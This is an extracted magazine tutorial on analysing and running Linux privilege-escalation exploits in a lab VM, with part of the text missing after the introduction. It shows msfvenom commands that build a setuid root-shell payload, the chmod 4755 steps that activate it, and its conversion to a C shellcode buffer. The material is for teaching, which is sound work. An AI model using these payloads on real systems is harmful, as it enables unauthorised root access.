  md: '# Tutorial


    # Exploits


    # # Analyse, adjust and run exploits in a controlled environment


    Running exploits out-of-the-box is a perilous business: it can lead to a total
    system crash


    ![](img/1f330653f83dcf0397f7d224ce8bbc16_37_0.png)


    Toni Castillo Girona holds a bachelor’s degree in Software Engineering and works
    as an ICT research support expert in a public university cited in Catalonia (Spain).
    He writes regularly about GNU/Linux in his blog: disabaues.upc.es.


    ![](img/1f330653f83dcf0397f7d224ce8bbc16_37_1.png)


    *Above By executing the tprobe-based exploit, we can overwrite /usr/bin/passwd
    and gain a root shell*


    Quite a few dangerous vulnerabilities have popped out lately, most of them exploitable
    by means of executing different Proof of Concept (PoC) scripts. Some of them even
    come with catchy names too (i.e. DirtyCOW). Sometimes these PoCs work out-of-the-box,
    but sometimes they don’t. So if a PoC does not yield the expected result, it does
    not necessarily mean that it has not affected the system in some way. If you execute
    an exploit and it does not work, maybe it is because that particular system is
    either not vulnerable or the PoC needs to be adjusted. Worst-case scenario: the
    exploit damages the system. This is why you need to analyse how the exploit really
    does, understand the vulnerability it is based on, and execute it in a controlled
    environment (i.e. a virtual machine). This tutorial will provide you with a general
    understanding of exploits by playing with three of the latest ones out there (as
    of this writing): CVE-2016-5195, CVE-2016-663 and CVE-2016-8664, along with a
    brief step-by-step guide to shellcode. Exploits are coded in all sorts of programming
    languages: C, Perl, Python, Ruby... Even in Bash. It is a good idea to analyse
    a particular exploit and then re-code it using your preferred language to prove
    that you have understood what it does.


    is delivered (at some point and by using different techniques) to the vulnerable
    application. You can write shellcode from scratch or by using msfvenom, a tool
    within the Metasploit Framework. WebSecurity Dojo architecture is x86, so let’s
    generate an ELF32 binary that will spawn a new shell. Type this in your Kali Linux
    terminal:


    ```

    msfvenom -p linux/x86/exec -a x86 chmod=/bin/bash PrependSetuid=True -f elf >
    myshell1

    ```


    Try it: copy the file to your WebSecurity Dojo VM:


    ```

    scp myshell1 dojo@YOUR_DOJO_IP:

    ```


    From within WebSecurity Dojo, you need to type these commands to take the owner
    and finally set the execution and sticky bits on myshell1.


    ```

    sudo chown root:root myshell1

    sudo chmod 4755 myshell1

    ```


    Execute it as user dojo and you will get a new root shell.


    ```

    ./myshell1

    bash-4.2#

    ```


    # ### Convert the shellcode to a C-char buffer (hex op. codes)


    You can tell msfvenom to output the payload using different formats. By using
    elf as before, we are in fact generating a Linux executable that can be run out-of-the-box.
    You can play with other formats and see what happens (-h). It is common to embed
    shellcode inside a PoC script. This PoC can be written in C, Python, or whatever.
    So you need to adjust the payload format accordingly so it fits nicely within
    your PoC. Let’s imagine you want all the bytes from our previous payload to be
    converted into a C-char buffer. To do so, type this in WebSecurity Dojo:


    ```

    xxd -i myshell1

    ```


    A byte-by-byte representation of myshell1 will be outputted as a C-char array
    along with its length:


    ```

    unsigned char myshell1[] = {  0x7f, 0x45, 0x4c, 0x46, 0x01...  };

    unsigned int myshell1_len = 136;

    ```


